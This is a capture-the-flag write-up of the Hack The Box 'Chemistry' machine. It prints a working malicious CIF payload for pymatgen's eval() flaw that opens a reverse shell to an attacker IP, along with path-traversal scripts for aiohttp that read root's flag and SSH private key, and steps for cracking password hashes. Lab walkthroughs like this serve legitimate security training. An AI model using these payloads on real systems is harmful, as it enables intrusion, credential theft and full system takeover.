---
title: HTB Chemistry Walkthrough
description: This yet another HTB Season 6 (Aug-Nov 2024) Machine in Easy Category. This was a Linux Machine vulnerable to Arbitrary Code Execution due to Python's package which is pymatgen ver. <= 2024.2.8 insecurely utilizes eval() for processing input, which allows execution of arbitrary code when parsing malicious CIF file. It is also vulnerable to LFI/Path Traversal because of how Aiohttp ver <=3.9.1 handles requests for static resources.
categories:
 - Notes
tags:
- easy
- rce
- web
- linux
---

![Chemistry Banner](/assets/images/htb-chemistry-2024/Chemistry.png)

# Reconnaissance
## Nmap Scan
Start by enumerating the machine using NMAP. Output it to a **.txt** file for easy referrence later.
>**nmap -sV -A 10.10.11.38 -p- > nmap.txt**

![Enum1](/assets/images/htb-chemistry-2024/enum1.png)

There are two open ports.
- **Port 22 (ssh)**
- **Port 5000 (unpnp?)**
## Web Enumeration
Navigating to **http://10.10.11.38:5000/** will show a web page titled Chemistry CIF Analyzer.

![Enum2](/assets/images/htb-chemistry-2024/enum2.png)

I tried fuzzing to discover potential exploitable subdomains and directories but wasn't able to find anything valuable.

![Enum3](/assets/images/htb-chemistry-2024/enum3.png)

Then I tried to register a user and login, which reveals the Dashboard and a place to Upload a **CIF File**.

> **NOTES:** A CIF or Crystallographic Information File is the standard format for storing crystallographic structural data. CIF files are commonly used in crystallography to describe the structure of a crystal, including atomic positions, lattice parameters, and space group symmetry.

![Enum4](/assets/images/htb-chemistry-2024/enum4.png)

There is also an example of CIF File provided. So I try to upload it a because why not?

![Enum5](/assets/images/htb-chemistry-2024/enum5.png)

Upon uploading the file I click the **View** option which will brings us to the page above.

# Weaponization 
While learning of CIF File Vulnerabilities, I came across [this](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f) on Github. Seems like the **CVE-2024-23346** involves **pymatgen**.

> **NOTES:** pymatgen (Python Materials Genomics) is a robust, open-source Python library for materials analysis. Some of the main features include Highly flexible classes for the representation of Element, Site, Molecule, Structure objects.

After a few try-and-errors I crafted a payload using the exploit retrieved earlier and the **example.cif** that was given.

<pre>
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/[your_ip]/[your_port] 0>&1\'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
</pre>


> **IMPORTANT:** For **"/bin/bash -c \'sh -i >& /dev/tcp/[your_ip]/[your_port] 0>&1\\'"** part please change to your IP and Port accordingly and don't forget to setup a **listener**.

> **Example:** **"/bin/bash -c \'sh -i >& /dev/tcp/10.10.10.10/9780 0>&1\\'"** and **nc -nlvp 9780**

> **NOTES:** **Escaping with Backslashes:** The single quotes within the system command are escaped with backslashes (\'). This is necessary because the string is enclosed in single quotes in the CIF file, and escaping helps ensure the shell interprets it correctly when the parser executes it. (I didn't include it in my first attempt so It failed)

# Delivery 

Next I upload the modified **example.cif** and click View.

![Exploit1](/assets/images/htb-chemistry-2024/exploit1.png)

# Exploitation 

Upon successful, a shell will be spawned on the listener.

> **python3 -c 'import pty;pty.spawn("/bin/bash")'**

![Exploit2](/assets/images/htb-chemistry-2024/exploit2.png)

GGs, we are in as user **app** and upgraded our shell as well.

Next, I try to poke around to see if there is anything interesting. Then I came across **database.db** at **/home/app/instance**. Then I run **sqlite3** to see the tables and found **user** table.

![Exploit3](/assets/images/htb-chemistry-2024/exploit3.png)

Hmmm seems like the password is encrypted using MD5 Hash. So I went to the OG [CrackStation](https://crackstation.net/) to crack the hash. 

![Exploit4](/assets/images/htb-chemistry-2024/exploit4.png)

BOOM we got a few results and most importantly the password for user **rosa** which has the **user.txt**.

Now we can simply retrieve the User Flag by login through SSH.

## User Flag
![User-Flag](/assets/images/htb-chemistry-2024/user-flag.png)

When enumerating the machine as user **rosa**, I found out that there is a service running on port **8080**

![Root1](/assets/images/htb-chemistry-2024/root1.png)

So I try to port forward the service running on server's port 8080 to my local port **6969**.

> **ssh -L 6969:localhost:8080 rosa@10.10.11.38**

![Root2](/assets/images/htb-chemistry-2024/root2.png)

Now the service is accessible at **http://localhost:6969**

![Root3](/assets/images/htb-chemistry-2024/root3.png)

But there is almost nothing to see on the page itself. So I opened burpsuite to see if there is something valuable and I found the response to be quite interesting.

I used **curl** so that it only shows the response

> **curl -I http://localhost:6969**

![Root4](/assets/images/htb-chemistry-2024/root4.png)

> **FINDINGS: Aiohttp/3.9.1** is a python package is vulnerable to LFI/Path Traversal **CVE-2024-23334**.

Then I encountered [this](https://github.com/z3rObyte/CVE-2024-23334-PoC) github which contains **exploit.sh** which will be used later for exploiting.

But before that I did Fuzzing too to find any interesting directories.

>  **ffuf -u http://localhost:6969/FUZZ -w /path/to/wordlist**

![Root5](/assets/images/htb-chemistry-2024/root5.png)

From here we can see that there is only **/assets**. Accessing it directly won't give us anything so I tried to play around with **exploit.sh** that we get earlier.

![Root6](/assets/images/htb-chemistry-2024/root6.png)

Wow, we can actually read **/etc/passwd**. Now let's modify the payload to get the flag.

```bash
#!/bin/bash

url="http://localhost:6969"
string="../"
payload="/assets/"
file="root/root.txt" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"

    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```
> **NOTES:** the script is modified to read **/root/root.txt**. Don't forget to **chmod +x**

## Root Flag
Run the script and we will get the flag.

![Root-Flag](/assets/images/htb-chemistry-2024/root-flag.png)

# Privilege Escalation

We got the root flag already, but not the root user. Now we need to modify the payload a bit to retrieve **id_rsa** for ssh.

```bash
#!/bin/bash

url="http://localhost:6969"
string="../"
payload="/assets/"
file="root/.ssh/id_rsa" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"

    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```
> **NOTES:** the script is modified to read **/root/.ssh/id_rsa**.

![PrivEsc1](/assets/images/htb-chemistry-2024/privesc1.png)

We will get the private key, copy and save it. Then change the permission and ssh as root.

> **chmod 600 id_rsa**

> **ssh -i id_rsa root@10.10.11.38**

![PrivEsc2](/assets/images/htb-chemistry-2024/privesc2.png)

GGWP.

![PrivEsc3](/assets/images/htb-chemistry-2024/privesc3.png)

# Summary

This machine contains 2 vulnerable python packages. Overall it was a fun machine and I enjoyed writing this as I'm trying to improve the quality of my Writeups. I hope you guys enjoyed reading :P

# Notes
Soon.







